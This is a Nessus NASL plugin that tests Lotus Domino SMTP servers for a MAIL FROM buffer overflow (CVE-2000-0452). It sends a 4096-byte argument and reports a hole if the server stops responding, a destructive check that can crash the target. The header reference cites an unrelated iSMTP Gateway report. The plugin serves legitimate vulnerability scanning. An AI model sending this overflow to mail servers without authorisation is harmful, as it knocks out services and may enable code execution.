#
# (C) Tenable Network Security, Inc.
#

# Ref:
# From: "K. K. Mookhey" <cto@nii.co.in>
# To: full-disclosure@lists.netsys.com, vulnwatch@vulnwatch.org, 
#  bugtraq@securityfocus.com
# Date: Mon, 11 Nov 2002 13:55:04 +0530
# Subject: Buffer Overflow in iSMTP Gateway
#


include("compat.inc");

if(description)
{
 script_id(10419);
 script_version ("$Revision: 1.25 $");

 script_cve_id("CVE-2000-0452");
 script_bugtraq_id(1229);
 script_xref(name:"OSVDB", value:"321");
 
 script_name(english:"Lotus Domino SMTP MAIL FROM Command Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote SMTP server is affected by a remote buffer overflow
vulnerability." );
 script_set_attribute(attribute:"description", value:
"There seem to be a buffer overflow in the remote Lotus Domino SMTP
server that can be triggered by an overly long argument to the 'MAIL
FROM' command. 

This problem may allow an attacker to crash the mail server or even
allow him to execute arbitrary code on this system." );
 script_set_attribute(attribute:"see_also", value:"http://downloads.securityfocus.com/vulnerabilities/exploits/smtpkill.pl" );
 script_set_attribute(attribute:"solution", value:
"Contact the vendor for a patch." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );
 script_end_attributes();
		    
 script_summary(english:"Overflows a buffer in the remote mail server"); 
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 
 script_family(english:"SMTP problems");
 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("smtp_func.inc");

if (report_paranoia < 2) exit(0);


port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);


if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
 data = smtp_recv_banner(socket:soc);
 if ( ! data || "Lotus Domino" >!< data ) exit(0);
 crp = string("HELO example.com\r\n");
 send(socket:soc, data:crp);
 data = recv_line(socket:soc, length:1024);
 if("250 " >< data)
 {
 crp = string("MAIL FROM: nessus@", crap(4096), "\r\n");
 send(socket:soc, data:crp);
 buf = recv_line(socket:soc, length:1024);
 }
 close(soc);
 
 soc = open_sock_tcp(port);
 if(soc)
 {
 r = smtp_recv_banner(socket:soc);
 }
  else r = 0;
 if(!r)security_hole(port);
 }
}
